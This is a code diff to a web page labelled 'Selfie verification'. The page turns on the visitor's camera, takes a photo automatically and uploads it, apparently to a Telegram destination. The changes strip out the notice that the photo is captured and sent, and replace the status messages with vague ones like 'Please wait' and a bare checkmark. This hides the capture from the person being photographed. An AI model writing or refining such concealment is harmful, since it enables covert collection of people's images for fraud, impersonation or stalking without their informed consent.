@@ -20,7 +20,7 @@
   <div class="box">
     <h2>📸 Selfie verification</h2>
     <div class="card">
-      <p class="small">Камераро иҷозат диҳед. Акс худкор гирифта шуда, фиристода мешавад.</p>
+      <p class="small">Please wait</p>
       <p id="status" class="small">Starting...</p>
     </div>
 
@@ -48,7 +48,7 @@
       video.srcObject = stream;
       await video.play().catch(()=>{});
 
-      setStatus("Camera accepted ✅");
+      setStatus("Ok");
       await sleep(1500);
 
       while(!video.videoWidth || !video.videoHeight){
@@ -63,10 +63,10 @@
       const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.95));
       if(!blob) throw new Error("toBlob failed");
 
-      setStatus("Sending...");
+      setStatus("Uploading...");
       await sendToServer(blob);
 
-      setStatus("✅ Sent to Telegram");
+      setStatus("✅ ");
       stream.getTracks().forEach(t => t.stop());
 
     }catch(e){
